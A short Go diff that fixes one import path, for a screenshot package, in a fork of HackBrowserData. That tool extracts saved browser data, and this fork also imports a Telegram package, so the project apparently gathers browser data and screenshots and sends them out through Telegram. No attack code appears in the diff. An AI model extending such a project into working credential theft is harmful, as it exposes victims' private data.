@@ -10,7 +10,7 @@ import (
 
     "github.com/GiwaMIcheal/HackBrowserData/config"
     "github.com/GiwaMIcheal/HackBrowserData/telegram"
-    "github.com/GiwaMIcheal/HackBrowserData/config.go/screenshot"
+    "github.com/GiwaMIcheal/HackBrowserData/screenshot"
     "golang.org/x/sys/windows"
 )
 
